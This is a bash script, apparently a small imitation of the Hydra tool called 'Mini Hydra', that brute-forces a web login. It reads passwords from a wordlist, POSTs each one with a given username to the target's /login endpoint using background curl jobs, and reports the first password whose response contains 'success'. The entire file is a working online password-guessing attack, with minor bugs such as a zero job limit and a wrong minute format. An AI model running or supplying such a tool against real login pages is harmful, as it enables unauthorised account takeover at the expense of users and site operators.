#!/usr/bin/env bash

url_validation(){

	url="$1"

	if [[ -z "$url" ]]; then

		echo "./mini_http: option requires an argument -- u"
		return 1

	elif [[ ! "$url" =~ ^https?://[a-zA-Z0-9_.-]+(:[0-9]+)?(/.*)?$ ]]; then

		echo "Error: Invalid url"
		return 1
	fi

	echo "$url"
}

user_validation(){

	username="$1"

	if [[ -z "$username" ]]; then

		echo "Error: username required"
		return 1
	fi

	echo "$username"
}

wordlist_validation(){

	word_list="$1"

	if [[ -z "$word_list" ]]; then

		echo "./mini_hydra: option requires an argument -- w"
		return 1

	elif [[ ! -f "$word_list" ]]; then

		echo "File does'nt exists"
		return 1
	fi

	echo "$word_list"
}

main(){

	if ! url=$(url_validation "$1"); then
		echo "$url"
		exit 1
	fi

	if ! user=$(user_validation "$2"); then

		echo "$user"
		exit 1
	fi

	if ! wl=$(wordlist_validation "$3"); then

		echo "$wl"
		exit 1
	fi

	begin "$url" "$user" "$wl"

}
begin(){

	url="$1"
	user="$2"
	wl="$3"

	words=$(wc -l $wl | awk '{print $1}')	
	_date=$(date "+%Y-%m-%d %H:%m")
	printf "\n=================================================\n"
	echo "	Mini Hydra"
	echo "	Target	: $url"
	echo "	User	: $user"
	echo "	Words	: $words"
	echo "	Date	: $_date"
	printf "===================================================\n\n"

	attempts=0
	max_jobs=0
	start=$(date +%s%N)
	_pass=""

	declare -A jobs
	while read -r pass
	do

		[[ -z "$pass" ]] && continue

		echo "[-] Trying: $pass"

		((attempts++))

		(

			response=$(curl -s -X Post "$url/login" -d "username=$user&password=$pass")

			if [[ "$response" == *success* ]]; then

				exit 0
			else
				exit 1
			fi

		) &

		 pid=$!
    		 jobs["$pid"]="$pass"

    		 if (( ${#jobs[@]} >= max_jobs )); then

       			 wait -n -p finished_pid "${!jobs[@]}"
        		 status=$?

        		 finished_pass="${jobs[$finished_pid]}"
        		 unset 'jobs[$finished_pid]'

        		if (( status == 0 )); then
            			echo "[+] FOUND → $user:$finished_pass"

            			# Stop remaining workers
           		 	kill "${!jobs[@]}" 2>/dev/null
           	 		wait 2>/dev/null

				end=$(date +%s%N)

	                        elapsed=$((end - start))
        	                in_sec=$(awk "BEGIN {printf \"%.2f\", $elapsed / 1000000000}")

                	        final_report "$finished_pass" "$attempts" "$in_sec"

            			exit 0
        		fi
    		fi

	done < "$wl"

	# Collect whatever requests are still running
	while (( ${#jobs[@]} > 0 )); do


   		 wait -n -p finished_pid "${!jobs[@]}"
   		 status=$?

    		finished_pass="${jobs[$finished_pid]}"
    		unset 'jobs[$finished_pid]'

    		if (( status == 0 )); then
			 ((attempts++))
        		echo "[+] FOUND → $user:$finished_pass"

	       		kill "${!jobs[@]}" 2>/dev/null
        		wait 2>/dev/null

			 end=$(date +%s%N)

         		elapsed=$((end - start))
         		in_sec=$(awk "BEGIN {printf \"%.2f\", $elapsed / 1000000000}")

         		final_report "$finished_pass" "$attempts" "$in_sec"

        		exit 0
    		fi

	done
}
final_report(){

	pass="$1"
	atmps="$2"
	_time="$3"

	printf "\n=======================================\n"
	printf "[*] %-10s : %s\n" "Password" "$pass"
	printf "[*] %-10s : %s\n" "Attempts" "$atmps"
	printf "[*] %-10s : %ss\n" "Time" "$_time"
	printf "=========================================="

}
while getopts ":u:U:w:" opts
do

	case "$opts" in
		u) url="$OPTARG"
		   u_given=true ;;

	        U) user="$OPTARG"
	           user_given=true ;;

	        w) wordlist="$OPTARG"
	           w_given=true ;;

	esac
done

main "$url" "$user" "$wordlist"
